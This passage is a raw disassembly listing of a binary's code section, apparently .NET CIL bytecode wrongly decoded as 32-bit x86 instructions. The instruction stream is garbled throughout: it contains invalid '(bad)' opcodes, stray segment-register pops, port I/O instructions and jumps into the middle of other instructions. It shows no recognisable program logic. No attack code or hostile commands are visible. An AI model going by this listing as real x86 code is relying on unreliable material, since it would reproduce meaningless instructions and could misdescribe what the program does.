  40306a:	15 33 00 00 01       	adc    $0x1000033,%eax
  40306f:	02 15 25 0a 7d 2a    	add    0x2a7d0a25,%dl
  403075:	00 00                	add    %al,(%eax)
  403077:	04 12                	add    $0x12,%al
  403079:	03 28                	add    (%eax),%ebp
  40307b:	8e 00                	mov    (%eax),%es
  40307d:	00 0a                	add    %cl,(%edx)
  40307f:	07                   	pop    %es
  403080:	1f                   	pop    %ds
  403081:	64 28 0c 00          	sub    %cl,%fs:(%eax,%eax,1)
  403085:	00 06                	add    %al,(%esi)
  403087:	6f                   	outsl  %ds:(%esi),(%dx)
  403088:	8b 00                	mov    (%eax),%eax
  40308a:	00 0a                	add    %cl,(%edx)
  40308c:	0d 12 03 28 8c       	or     $0x8c280312,%eax
  403091:	00 00                	add    %al,(%eax)
  403093:	0a 2d 3f 02 17 25    	or     0x2517023f,%ch
  403099:	0a 7d 2a             	or     0x2a(%ebp),%bh
  40309c:	00 00                	add    %al,(%eax)
  40309e:	04 02                	add    $0x2,%al
  4030a0:	09 7d 30             	or     %edi,0x30(%ebp)
  4030a3:	00 00                	add    %al,(%eax)
  4030a5:	04 02                	add    $0x2,%al
  4030a7:	7c 2b                	jl     0x4030d4
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	04 12                	add    $0x12,%al
  4030ad:	03 02                	add    (%edx),%eax
  4030af:	28 11                	sub    %dl,(%ecx)
  4030b1:	00 00                	add    %al,(%eax)
  4030b3:	2b dd                	sub    %ebp,%ebx
  4030b5:	16                   	push   %ss
  4030b6:	03 00                	add    (%eax),%eax
  4030b8:	00 02                	add    %al,(%edx)
  4030ba:	7b 30                	jnp    0x4030ec
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	04 0d                	add    $0xd,%al
  4030c0:	02 7c 30 00          	add    0x0(%eax,%esi,1),%bh
  4030c4:	00 04 fe             	add    %al,(%esi,%edi,8)
  4030c7:	15 33 00 00 01       	adc    $0x1000033,%eax
  4030cc:	02 15 25 0a 7d 2a    	add    0x2a7d0a25,%dl
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	04 12                	add    $0x12,%al
  4030d6:	03 28                	add    (%eax),%ebp
  4030d8:	8e 00                	mov    (%eax),%es
  4030da:	00 0a                	add    %cl,(%edx)
  4030dc:	02 28                	add    (%eax),%ch
  4030de:	9d                   	popf
  4030df:	00 00                	add    %al,(%eax)
  4030e1:	0a 6f 9e             	or     -0x62(%edi),%ch
  4030e4:	00 00                	add    %al,(%eax)
  4030e6:	0a 72 dd             	or     -0x23(%edx),%dh
  4030e9:	01 00                	add    %eax,(%eax)
  4030eb:	70 72                	jo     0x40315f
  4030ed:	eb 01                	jmp    0x4030f0
  4030ef:	00 70 28             	add    %dh,0x28(%eax)
  4030f2:	9f                   	lahf
  4030f3:	00 00                	add    %al,(%eax)
  4030f5:	0a 7d 2f             	or     0x2f(%ebp),%bh
  4030f8:	00 00                	add    %al,(%eax)
  4030fa:	04 07                	add    $0x7,%al
  4030fc:	02 7b 2f             	add    0x2f(%ebx),%bh
  4030ff:	00 00                	add    %al,(%eax)
  403101:	04 28                	add    $0x28,%al
  403103:	0e                   	push   %cs
  403104:	00 00                	add    %al,(%eax)
  403106:	06                   	push   %es
  403107:	6f                   	outsl  %ds:(%esi),(%dx)
  403108:	96                   	xchg   %eax,%esi
  403109:	00 00                	add    %al,(%eax)
  40310b:	0a 13                	or     (%ebx),%dl
  40310d:	04 12                	add    $0x12,%al
  40310f:	04 28                	add    $0x28,%al
  403111:	97                   	xchg   %eax,%edi
  403112:	00 00                	add    %al,(%eax)
  403114:	0a 2d 41 02 18 25    	or     0x25180241,%ch
  40311a:	0a 7d 2a             	or     0x2a(%ebp),%bh
  40311d:	00 00                	add    %al,(%eax)
  40311f:	04 02                	add    $0x2,%al
  403121:	11 04 7d 31 00 00 04 	adc    %eax,0x4000031(,%edi,2)
  403128:	02 7c 2b 00          	add    0x0(%ebx,%ebp,1),%bh
  40312c:	00 04 12             	add    %al,(%edx,%edx,1)
  40312f:	04 02                	add    $0x2,%al
  403131:	28 12                	sub    %dl,(%edx)
  403133:	00 00                	add    %al,(%eax)
  403135:	2b dd                	sub    %ebp,%ebx
  403137:	94                   	xchg   %eax,%esp
  403138:	02 00                	add    (%eax),%al
  40313a:	00 02                	add    %al,(%edx)
  40313c:	7b 31                	jnp    0x40316f
  40313e:	00 00                	add    %al,(%eax)
  403140:	04 13                	add    $0x13,%al
  403142:	04 02                	add    $0x2,%al
  403144:	7c 31                	jl     0x403177
  403146:	00 00                	add    %al,(%eax)
  403148:	04 fe                	add    $0xfe,%al
  40314a:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  40314f:	02 15 25 0a 7d 2a    	add    0x2a7d0a25,%dl
  403155:	00 00                	add    %al,(%eax)
  403157:	04 12                	add    $0x12,%al
  403159:	04 28                	add    $0x28,%al
  40315b:	99                   	cltd
  40315c:	00 00                	add    %al,(%eax)
  40315e:	0a 2d 6d 07 72 03    	or     0x372076d,%ch
  403164:	02 00                	add    (%eax),%al
  403166:	70 72                	jo     0x4031da
  403168:	19 02                	sbb    %eax,(%edx)
  40316a:	00 70 16             	add    %dh,0x16(%eax)
  40316d:	1f                   	pop    %ds
  40316e:	10 28                	adc    %ch,(%eax)
  403170:	0d 00 00 06 6f       	or     $0x6f060000,%eax
  403175:	8b 00                	mov    (%eax),%eax
  403177:	00 0a                	add    %cl,(%edx)
  403179:	0d 12 03 28 8c       	or     $0x8c280312,%eax
  40317e:	00 00                	add    %al,(%eax)
  403180:	0a 2d 3f 02 19 25    	or     0x2519023f,%ch
  403186:	0a 7d 2a             	or     0x2a(%ebp),%bh
  403189:	00 00                	add    %al,(%eax)
  40318b:	04 02                	add    $0x2,%al
  40318d:	09 7d 30             	or     %edi,0x30(%ebp)
  403190:	00 00                	add    %al,(%eax)
  403192:	04 02                	add    $0x2,%al
  403194:	7c 2b                	jl     0x4031c1
  403196:	00 00                	add    %al,(%eax)
  403198:	04 12                	add    $0x12,%al
  40319a:	03 02                	add    (%edx),%eax
  40319c:	28 11                	sub    %dl,(%ecx)
  40319e:	00 00                	add    %al,(%eax)
  4031a0:	2b dd                	sub    %ebp,%ebx
  4031a2:	29 02                	sub    %eax,(%edx)
  4031a4:	00 00                	add    %al,(%eax)
  4031a6:	02 7b 30             	add    0x30(%ebx),%bh
  4031a9:	00 00                	add    %al,(%eax)
  4031ab:	04 0d                	add    $0xd,%al
  4031ad:	02 7c 30 00          	add    0x0(%eax,%esi,1),%bh
  4031b1:	00 04 fe             	add    %al,(%esi,%edi,8)
  4031b4:	15 33 00 00 01       	adc    $0x1000033,%eax
  4031b9:	02 15 25 0a 7d 2a    	add    0x2a7d0a25,%dl
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	04 12                	add    $0x12,%al
  4031c3:	03 28                	add    (%eax),%ebp
  4031c5:	8e 00                	mov    (%eax),%es
  4031c7:	00 0a                	add    %cl,(%edx)
  4031c9:	dd ee                	fucomp %st(6)
  4031cb:	01 00                	add    %eax,(%eax)
  4031cd:	00 07                	add    %al,(%edi)
  4031cf:	02 7b 2f             	add    0x2f(%ebx),%bh
  4031d2:	00 00                	add    %al,(%eax)
  4031d4:	04 28                	add    $0x28,%al
  4031d6:	0a 00                	or     (%eax),%al
  4031d8:	00 06                	add    %al,(%esi)
  4031da:	6f                   	outsl  %ds:(%esi),(%dx)
  4031db:	83 00 00             	addl   $0x0,(%eax)
  4031de:	0a 13                	or     (%ebx),%dl
  4031e0:	05 12 05 28 84       	add    $0x84280512,%eax
  4031e5:	00 00                	add    %al,(%eax)
  4031e7:	0a 2d 41 02 1a 25    	or     0x251a0241,%ch
  4031ed:	0a 7d 2a             	or     0x2a(%ebp),%bh
  4031f0:	00 00                	add    %al,(%eax)
  4031f2:	04 02                	add    $0x2,%al
  4031f4:	11 05 7d 32 00 00    	adc    %eax,0x327d
  4031fa:	04 02                	add    $0x2,%al
  4031fc:	7c 2b                	jl     0x403229
  4031fe:	00 00                	add    %al,(%eax)
  403200:	04 12                	add    $0x12,%al
  403202:	05 02 28 13 00       	add    $0x132802,%eax
  403207:	00 2b                	add    %ch,(%ebx)
  403209:	dd c1                	ffree  %st(1)
  40320b:	01 00                	add    %eax,(%eax)
  40320d:	00 02                	add    %al,(%edx)
  40320f:	7b 32                	jnp    0x403243
  403211:	00 00                	add    %al,(%eax)
  403213:	04 13                	add    $0x13,%al
  403215:	05 02 7c 32 00       	add    $0x327c02,%eax
  40321a:	00 04 fe             	add    %al,(%esi,%edi,8)
  40321d:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403222:	02 15 25 0a 7d 2a    	add    0x2a7d0a25,%dl
  403228:	00 00                	add    %al,(%eax)
  40322a:	04 12                	add    $0x12,%al
  40322c:	05 28 86 00 00       	add    $0x8628,%eax
  403231:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403234:	8e 2d 6d 07 72 27    	mov    0x2772076d,%gs
  40323a:	02 00                	add    (%eax),%al
  40323c:	70 72                	jo     0x4032b0
  40323e:	19 02                	sbb    %eax,(%edx)
  403240:	00 70 16             	add    %dh,0x16(%eax)
  403243:	1f                   	pop    %ds
  403244:	10 28                	adc    %ch,(%eax)
  403246:	0d 00 00 06 6f       	or     $0x6f060000,%eax
  40324b:	8b 00                	mov    (%eax),%eax
  40324d:	00 0a                	add    %cl,(%edx)
  40324f:	0d 12 03 28 8c       	or     $0x8c280312,%eax
  403254:	00 00                	add    %al,(%eax)
  403256:	0a 2d 3f 02 1b 25    	or     0x251b023f,%ch
  40325c:	0a 7d 2a             	or     0x2a(%ebp),%bh
  40325f:	00 00                	add    %al,(%eax)
  403261:	04 02                	add    $0x2,%al
  403263:	09 7d 30             	or     %edi,0x30(%ebp)
  403266:	00 00                	add    %al,(%eax)
  403268:	04 02                	add    $0x2,%al
  40326a:	7c 2b                	jl     0x403297
  40326c:	00 00                	add    %al,(%eax)
  40326e:	04 12                	add    $0x12,%al
  403270:	03 02                	add    (%edx),%eax
  403272:	28 11                	sub    %dl,(%ecx)
  403274:	00 00                	add    %al,(%eax)
  403276:	2b dd                	sub    %ebp,%ebx
  403278:	53                   	push   %ebx
  403279:	01 00                	add    %eax,(%eax)
  40327b:	00 02                	add    %al,(%edx)
  40327d:	7b 30                	jnp    0x4032af
  40327f:	00 00                	add    %al,(%eax)
  403281:	04 0d                	add    $0xd,%al
  403283:	02 7c 30 00          	add    0x0(%eax,%esi,1),%bh
  403287:	00 04 fe             	add    %al,(%esi,%edi,8)
  40328a:	15 33 00 00 01       	adc    $0x1000033,%eax
  40328f:	02 15 25 0a 7d 2a    	add    0x2a7d0a25,%dl
  403295:	00 00                	add    %al,(%eax)
  403297:	04 12                	add    $0x12,%al
  403299:	03 28                	add    (%eax),%ebp
  40329b:	8e 00                	mov    (%eax),%es
  40329d:	00 0a                	add    %cl,(%edx)
  40329f:	dd 18                	fstpl  (%eax)
  4032a1:	01 00                	add    %eax,(%eax)
  4032a3:	00 07                	add    %al,(%edi)
  4032a5:	08 28                	or     %ch,(%eax)
  4032a7:	0b 00                	or     (%eax),%eax
  4032a9:	00 06                	add    %al,(%esi)
  4032ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ac:	8b 00                	mov    (%eax),%eax
  4032ae:	00 0a                	add    %cl,(%edx)
  4032b0:	0d 12 03 28 8c       	or     $0x8c280312,%eax
  4032b5:	00 00                	add    %al,(%eax)
  4032b7:	0a 2d 3f 02 1c 25    	or     0x251c023f,%ch
  4032bd:	0a 7d 2a             	or     0x2a(%ebp),%bh
  4032c0:	00 00                	add    %al,(%eax)
  4032c2:	04 02                	add    $0x2,%al
  4032c4:	09 7d 30             	or     %edi,0x30(%ebp)
  4032c7:	00 00                	add    %al,(%eax)
  4032c9:	04 02                	add    $0x2,%al
  4032cb:	7c 2b                	jl     0x4032f8
  4032cd:	00 00                	add    %al,(%eax)
  4032cf:	04 12                	add    $0x12,%al
  4032d1:	03 02                	add    (%edx),%eax
  4032d3:	28 11                	sub    %dl,(%ecx)
  4032d5:	00 00                	add    %al,(%eax)
  4032d7:	2b dd                	sub    %ebp,%ebx
  4032d9:	f2 00 00             	repnz add %al,(%eax)
  4032dc:	00 02                	add    %al,(%edx)
  4032de:	7b 30                	jnp    0x403310
  4032e0:	00 00                	add    %al,(%eax)
  4032e2:	04 0d                	add    $0xd,%al
  4032e4:	02 7c 30 00          	add    0x0(%eax,%esi,1),%bh
  4032e8:	00 04 fe             	add    %al,(%esi,%edi,8)
  4032eb:	15 33 00 00 01       	adc    $0x1000033,%eax
  4032f0:	02 15 25 0a 7d 2a    	add    0x2a7d0a25,%dl
  4032f6:	00 00                	add    %al,(%eax)
  4032f8:	04 12                	add    $0x12,%al
  4032fa:	03 28                	add    (%eax),%ebp
  4032fc:	8e 00                	mov    (%eax),%es
  4032fe:	00 0a                	add    %cl,(%edx)
  403300:	02 14 7d 2f 00 00 04 	add    0x400002f(,%edi,2),%dl
  403307:	de 13                	ficoms (%ebx)
  403309:	13 06                	adc    (%esi),%eax
  40330b:	02 11                	add    (%ecx),%dl
  40330d:	06                   	push   %es
  40330e:	7d 2d                	jge    0x40333d
  403310:	00 00                	add    %al,(%eax)
  403312:	04 02                	add    $0x2,%al
  403314:	17                   	pop    %ss
  403315:	7d 2e                	jge    0x403345
  403317:	00 00                	add    %al,(%eax)
  403319:	04 de                	add    $0xde,%al
  40331b:	00 02                	add    %al,(%edx)
  40331d:	7b 2e                	jnp    0x40334d
  40331f:	00 00                	add    %al,(%eax)
  403321:	04 13                	add    $0x13,%al
  403323:	07                   	pop    %es
  403324:	11 07                	adc    %eax,(%edi)
  403326:	17                   	pop    %ss
  403327:	33 71 02             	xor    0x2(%ecx),%esi
  40332a:	7b 2d                	jnp    0x403359
  40332c:	00 00                	add    %al,(%eax)
  40332e:	04 74                	add    $0x74,%al
  403330:	34 00                	xor    $0x0,%al
  403332:	00 01                	add    %al,(%ecx)
  403334:	26 07                	es pop %es
  403336:	72 3d                	jb     0x403375
  403338:	02 00                	add    (%eax),%al
  40333a:	70 72                	jo     0x4033ae
  40333c:	19 02                	sbb    %eax,(%edx)
  40333e:	00 70 16             	add    %dh,0x16(%eax)
  403341:	1f                   	pop    %ds
  403342:	10 28                	adc    %ch,(%eax)
  403344:	0d 00 00 06 6f       	or     $0x6f060000,%eax
  403349:	8b 00                	mov    (%eax),%eax
  40334b:	00 0a                	add    %cl,(%edx)
  40334d:	0d 12 03 28 8c       	or     $0x8c280312,%eax
  403352:	00 00                	add    %al,(%eax)
  403354:	0a 2d 3c 02 1d 25    	or     0x251d023c,%ch
  40335a:	0a 7d 2a             	or     0x2a(%ebp),%bh
  40335d:	00 00                	add    %al,(%eax)
  40335f:	04 02                	add    $0x2,%al
  403361:	09 7d 30             	or     %edi,0x30(%ebp)
  403364:	00 00                	add    %al,(%eax)
  403366:	04 02                	add    $0x2,%al
  403368:	7c 2b                	jl     0x403395
  40336a:	00 00                	add    %al,(%eax)
  40336c:	04 12                	add    $0x12,%al
  40336e:	03 02                	add    (%edx),%eax
  403370:	28 11                	sub    %dl,(%ecx)
  403372:	00 00                	add    %al,(%eax)
  403374:	2b de                	sub    %esi,%ebx
  403376:	58                   	pop    %eax
  403377:	02 7b 30             	add    0x30(%ebx),%bh
  40337a:	00 00                	add    %al,(%eax)
  40337c:	04 0d                	add    $0xd,%al
  40337e:	02 7c 30 00          	add    0x0(%eax,%esi,1),%bh
  403382:	00 04 fe             	add    %al,(%esi,%edi,8)
  403385:	15 33 00 00 01       	adc    $0x1000033,%eax
  40338a:	02 15 25 0a 7d 2a    	add    0x2a7d0a25,%dl
  403390:	00 00                	add    %al,(%eax)
  403392:	04 12                	add    $0x12,%al
  403394:	03 28                	add    (%eax),%ebp
  403396:	8e 00                	mov    (%eax),%es
  403398:	00 0a                	add    %cl,(%edx)
  40339a:	02 14 7d 2d 00 00 04 	add    0x400002d(,%edi,2),%dl
  4033a1:	de 19                	ficomps (%ecx)
  4033a3:	13 08                	adc    (%eax),%ecx
  4033a5:	02 1f                	add    (%edi),%bl
  4033a7:	fe                   	(bad)
  4033a8:	7d 2a                	jge    0x4033d4
  4033aa:	00 00                	add    %al,(%eax)
  4033ac:	04 02                	add    $0x2,%al
  4033ae:	7c 2b                	jl     0x4033db
  4033b0:	00 00                	add    %al,(%eax)
  4033b2:	04 11                	add    $0x11,%al
  4033b4:	08 28                	or     %ch,(%eax)
  4033b6:	92                   	xchg   %eax,%edx
  4033b7:	00 00                	add    %al,(%eax)
  4033b9:	0a de                	or     %dh,%bl
  4033bb:	13 02                	adc    (%edx),%eax
  4033bd:	1f                   	pop    %ds
  4033be:	fe                   	(bad)
  4033bf:	7d 2a                	jge    0x4033eb
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	04 02                	add    $0x2,%al
  4033c5:	7c 2b                	jl     0x4033f2
  4033c7:	00 00                	add    %al,(%eax)
  4033c9:	04 28                	add    $0x28,%al
  4033cb:	93                   	xchg   %eax,%ebx
  4033cc:	00 00                	add    %al,(%eax)
  4033ce:	0a 2a                	or     (%edx),%ch
  4033d0:	41                   	inc    %ecx
  4033d1:	34 00                	xor    $0x0,%al
  4033d3:	00 00                	add    %al,(%eax)
  4033d5:	00 00                	add    %al,(%eax)
  4033d7:	00 21                	add    %ah,(%ecx)
  4033d9:	00 00                	add    %al,(%eax)
  4033db:	00 08                	add    %cl,(%eax)
  4033dd:	03 00                	add    (%eax),%eax
  4033df:	00 29                	add    %ch,(%ecx)
  4033e1:	03 00                	add    (%eax),%eax
  4033e3:	00 13                	add    %dl,(%ebx)
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4033ea:	00 01                	add    %al,(%ecx)
  4033ec:	00 00                	add    %al,(%eax)
  4033ee:	00 00                	add    %al,(%eax)
  4033f0:	0e                   	push   %cs
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 b5 03 00 00 c3    	add    %dh,-0x3cfffffd(%ebp)
  4033f9:	03 00                	add    (%eax),%eax
  4033fb:	00 19                	add    %bl,(%ecx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 34 00             	add    %dh,(%eax,%eax,1)
  403402:	00 01                	add    %al,(%ecx)
  403404:	36 02 7c 2b 00       	add    %ss:0x0(%ebx,%ebp,1),%bh
  403409:	00 04 03             	add    %al,(%ebx,%eax,1)
  40340c:	28 94 00 00 0a 2a 00 	sub    %dl,0x2a0a00(%eax,%eax,1)
  403413:	00 1b                	add    %bl,(%ebx)
  403415:	30 03                	xor    %al,(%ebx)
  403417:	00 a1 00 00 00 0f    	add    %ah,0xf000000(%ecx)
  40341d:	00 00                	add    %al,(%eax)
  40341f:	11 02                	adc    %eax,(%edx)
  403421:	7b 33                	jnp    0x403456
  403423:	00 00                	add    %al,(%eax)
  403425:	04 0a                	add    $0xa,%al
  403427:	02 7b 35             	add    0x35(%ebx),%bh
  40342a:	00 00                	add    %al,(%eax)
  40342c:	04 0b                	add    $0xb,%al
  40342e:	06                   	push   %es
  40342f:	2c 40                	sub    $0x40,%al
  403431:	07                   	pop    %es
  403432:	fe 06                	incb   (%esi)
  403434:	15 00 00 06 73       	adc    $0x73060000,%eax
  403439:	6c                   	insb   (%dx),%es:(%edi)
  40343a:	00 00                	add    %al,(%eax)
  40343c:	0a 28                	or     (%eax),%ch
  40343e:	a0 00 00 0a 6f       	mov    0x6f0a0000,%al
  403443:	8b 00                	mov    (%eax),%eax
  403445:	00 0a                	add    %cl,(%edx)
  403447:	0c 12                	or     $0x12,%al
  403449:	02 28                	add    (%eax),%ch
  40344b:	8c 00                	mov    %es,(%eax)
  40344d:	00 0a                	add    %cl,(%edx)
  40344f:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  403454:	0a 7d 33             	or     0x33(%ebp),%bh
  403457:	00 00                	add    %al,(%eax)
  403459:	04 02                	add    $0x2,%al
  40345b:	08 7d 36             	or     %bh,0x36(%ebp)
  40345e:	00 00                	add    %al,(%eax)
  403460:	04 02                	add    $0x2,%al
  403462:	7c 34                	jl     0x403498
  403464:	00 00                	add    %al,(%eax)
  403466:	04 12                	add    $0x12,%al
  403468:	02 02                	add    (%edx),%al
  40346a:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40346d:	00 2b                	add    %ch,(%ebx)
  40346f:	de 4f 02             	fimuls 0x2(%edi)
  403472:	7b 36                	jnp    0x4034aa
  403474:	00 00                	add    %al,(%eax)
  403476:	04 0c                	add    $0xc,%al
  403478:	02 7c 36 00          	add    0x0(%esi,%esi,1),%bh
  40347c:	00 04 fe             	add    %al,(%esi,%edi,8)
  40347f:	15 33 00 00 01       	adc    $0x1000033,%eax
  403484:	02 15 25 0a 7d 33    	add    0x337d0a25,%dl
  40348a:	00 00                	add    %al,(%eax)
  40348c:	04 12                	add    $0x12,%al
  40348e:	02 28                	add    (%eax),%ch
  403490:	8e 00                	mov    (%eax),%es
  403492:	00 0a                	add    %cl,(%edx)
  403494:	de 17                	ficoms (%edi)
  403496:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  40349b:	33 00                	xor    (%eax),%eax
  40349d:	00 04 02             	add    %al,(%edx,%eax,1)
  4034a0:	7c 34                	jl     0x4034d6
  4034a2:	00 00                	add    %al,(%eax)
  4034a4:	04 09                	add    $0x9,%al
  4034a6:	28 92 00 00 0a de    	sub    %dl,-0x21f60000(%edx)
  4034ac:	13 02                	adc    (%edx),%eax
  4034ae:	1f                   	pop    %ds
  4034af:	fe                   	(bad)
  4034b0:	7d 33                	jge    0x4034e5
  4034b2:	00 00                	add    %al,(%eax)
  4034b4:	04 02                	add    $0x2,%al
  4034b6:	7c 34                	jl     0x4034ec
  4034b8:	00 00                	add    %al,(%eax)
  4034ba:	04 28                	add    $0x28,%al
  4034bc:	93                   	xchg   %eax,%ebx
  4034bd:	00 00                	add    %al,(%eax)
  4034bf:	0a 2a                	or     (%edx),%ch
  4034c1:	00 00                	add    %al,(%eax)
  4034c3:	00 01                	add    %al,(%ecx)
  4034c5:	10 00                	adc    %al,(%eax)
  4034c7:	00 00                	add    %al,(%eax)
  4034c9:	00 0e                	add    %cl,(%esi)
  4034cb:	00 68 76             	add    %ch,0x76(%eax)
  4034ce:	00 17                	add    %dl,(%edi)
  4034d0:	34 00                	xor    $0x0,%al
  4034d2:	00 01                	add    %al,(%ecx)
  4034d4:	36 02 7c 34 00       	add    %ss:0x0(%esp,%esi,1),%bh
  4034d9:	00 04 03             	add    %al,(%ebx,%eax,1)
  4034dc:	28 94 00 00 0a 2a 00 	sub    %dl,0x2a0a00(%eax,%eax,1)
  4034e3:	00 1b                	add    %bl,(%ebx)
  4034e5:	30 03                	xor    %al,(%ebx)
  4034e7:	00 aa 00 00 00 12    	add    %ch,0x12000000(%edx)
  4034ed:	00 00                	add    %al,(%eax)
  4034ef:	11 02                	adc    %eax,(%edx)
  4034f1:	7b 37                	jnp    0x40352a
  4034f3:	00 00                	add    %al,(%eax)
  4034f5:	04 0a                	add    $0xa,%al
  4034f7:	06                   	push   %es
  4034f8:	2c 50                	sub    $0x50,%al
  4034fa:	73 1b                	jae    0x403517
  4034fc:	00 00                	add    %al,(%eax)
  4034fe:	06                   	push   %es
  4034ff:	25 02 7b 39 00       	and    $0x397b02,%eax
  403504:	00 04 7d 12 00 00 04 	add    %al,0x4000012(,%edi,2)
  40350b:	fe 06                	incb   (%esi)
  40350d:	1c 00                	sbb    $0x0,%al
  40350f:	00 06                	add    %al,(%esi)
  403511:	73 6c                	jae    0x40357f
  403513:	00 00                	add    %al,(%eax)
  403515:	0a 28                	or     (%eax),%ch
  403517:	a0 00 00 0a 6f       	mov    0x6f0a0000,%al
  40351c:	8b 00                	mov    (%eax),%eax
  40351e:	00 0a                	add    %cl,(%edx)
  403520:	0b 12                	or     (%edx),%edx
  403522:	01 28                	add    %ebp,(%eax)
  403524:	8c 00                	mov    %es,(%eax)
  403526:	00 0a                	add    %cl,(%edx)
  403528:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  40352d:	0a 7d 37             	or     0x37(%ebp),%bh
  403530:	00 00                	add    %al,(%eax)
  403532:	04 02                	add    $0x2,%al
  403534:	07                   	pop    %es
  403535:	7d 3a                	jge    0x403571
  403537:	00 00                	add    %al,(%eax)
  403539:	04 02                	add    $0x2,%al
  40353b:	7c 38                	jl     0x403575
  40353d:	00 00                	add    %al,(%eax)
  40353f:	04 12                	add    $0x12,%al
  403541:	01 02                	add    %eax,(%edx)
  403543:	28 15 00 00 2b de    	sub    %dl,0xde2b0000
  403549:	4f                   	dec    %edi
  40354a:	02 7b 3a             	add    0x3a(%ebx),%bh
  40354d:	00 00                	add    %al,(%eax)
  40354f:	04 0b                	add    $0xb,%al
  403551:	02 7c 3a 00          	add    0x0(%edx,%edi,1),%bh
  403555:	00 04 fe             	add    %al,(%esi,%edi,8)
  403558:	15 33 00 00 01       	adc    $0x1000033,%eax
  40355d:	02 15 25 0a 7d 37    	add    0x377d0a25,%dl
  403563:	00 00                	add    %al,(%eax)
  403565:	04 12                	add    $0x12,%al
  403567:	01 28                	add    %ebp,(%eax)
  403569:	8e 00                	mov    (%eax),%es
  40356b:	00 0a                	add    %cl,(%edx)
  40356d:	de 17                	ficoms (%edi)
  40356f:	0c 02                	or     $0x2,%al
  403571:	1f                   	pop    %ds
  403572:	fe                   	(bad)
  403573:	7d 37                	jge    0x4035ac
  403575:	00 00                	add    %al,(%eax)
  403577:	04 02                	add    $0x2,%al
  403579:	7c 38                	jl     0x4035b3
  40357b:	00 00                	add    %al,(%eax)
  40357d:	04 08                	add    $0x8,%al
  40357f:	28 92 00 00 0a de    	sub    %dl,-0x21f60000(%edx)
  403585:	13 02                	adc    (%edx),%eax
  403587:	1f                   	pop    %ds
  403588:	fe                   	(bad)
  403589:	7d 37                	jge    0x4035c2
  40358b:	00 00                	add    %al,(%eax)
  40358d:	04 02                	add    $0x2,%al
  40358f:	7c 38                	jl     0x4035c9
  403591:	00 00                	add    %al,(%eax)
  403593:	04 28                	add    $0x28,%al
  403595:	93                   	xchg   %eax,%ebx
  403596:	00 00                	add    %al,(%eax)
  403598:	0a 2a                	or     (%edx),%ch
  40359a:	00 00                	add    %al,(%eax)
  40359c:	01 10                	add    %edx,(%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 00                	add    %al,(%eax)
  4035a2:	07                   	pop    %es
  4035a3:	00 78 7f             	add    %bh,0x7f(%eax)
  4035a6:	00 17                	add    %dl,(%edi)
  4035a8:	34 00                	xor    $0x0,%al
  4035aa:	00 01                	add    %al,(%ecx)
  4035ac:	36 02 7c 38 00       	add    %ss:0x0(%eax,%edi,1),%bh
  4035b1:	00 04 03             	add    %al,(%ebx,%eax,1)
  4035b4:	28 94 00 00 0a 2a 00 	sub    %dl,0x2a0a00(%eax,%eax,1)
  4035bb:	00 1b                	add    %bl,(%ebx)
  4035bd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4035c0:	16                   	push   %ss
  4035c1:	01 00                	add    %eax,(%eax)
  4035c3:	00 13                	add    %dl,(%ebx)
  4035c5:	00 00                	add    %al,(%eax)
  4035c7:	11 02                	adc    %eax,(%edx)
  4035c9:	7b 3b                	jnp    0x403606
  4035cb:	00 00                	add    %al,(%eax)
  4035cd:	04 0a                	add    $0xa,%al
  4035cf:	02 7b 3d             	add    0x3d(%ebx),%bh
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	04 0b                	add    $0xb,%al
  4035d6:	06                   	push   %es
  4035d7:	39 90 00 00 00 73    	cmp    %edx,0x73000000(%eax)
  4035dd:	1f                   	pop    %ds
  4035de:	00 00                	add    %al,(%eax)
  4035e0:	06                   	push   %es
  4035e1:	0c 08                	or     $0x8,%al
  4035e3:	02 7b 3d             	add    0x3d(%ebx),%bh
  4035e6:	00 00                	add    %al,(%eax)
  4035e8:	04 7d                	add    $0x7d,%al
  4035ea:	15 00 00 04 08       	adc    $0x8040000,%eax
  4035ef:	02 7b 3e             	add    0x3e(%ebx),%bh
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	04 7d                	add    $0x7d,%al
  4035f6:	16                   	push   %ss
  4035f7:	00 00                	add    %al,(%eax)
  4035f9:	04 08                	add    $0x8,%al
  4035fb:	02 7b 3f             	add    0x3f(%ebx),%bh
  4035fe:	00 00                	add    %al,(%eax)
  403600:	04 7d                	add    $0x7d,%al
  403602:	17                   	pop    %ss
  403603:	00 00                	add    %al,(%eax)
  403605:	04 08                	add    $0x8,%al
  403607:	02 7b 40             	add    0x40(%ebx),%bh
  40360a:	00 00                	add    %al,(%eax)
  40360c:	04 7d                	add    $0x7d,%al
  40360e:	18 00                	sbb    %al,(%eax)
  403610:	00 04 08             	add    %al,(%eax,%ecx,1)
  403613:	02 7b 41             	add    0x41(%ebx),%bh
  403616:	00 00                	add    %al,(%eax)
  403618:	04 7d                	add    $0x7d,%al
  40361a:	19 00                	sbb    %eax,(%eax)
  40361c:	00 04 07             	add    %al,(%edi,%eax,1)
  40361f:	28 6b 00             	sub    %ch,0x0(%ebx)
  403622:	00 0a                	add    %cl,(%edx)
  403624:	2c 6b                	sub    $0x6b,%al
  403626:	07                   	pop    %es
  403627:	08 fe                	or     %bh,%dh
  403629:	06                   	push   %es
  40362a:	20 00                	and    %al,(%eax)
  40362c:	00 06                	add    %al,(%esi)
  40362e:	73 8a                	jae    0x4035ba
  403630:	00 00                	add    %al,(%eax)
  403632:	0a 28                	or     (%eax),%ch
  403634:	6d                   	insl   (%dx),%es:(%edi)
  403635:	00 00                	add    %al,(%eax)
  403637:	0a 74 27 00          	or     0x0(%edi,%eiz,1),%dh
  40363b:	00 01                	add    %al,(%ecx)
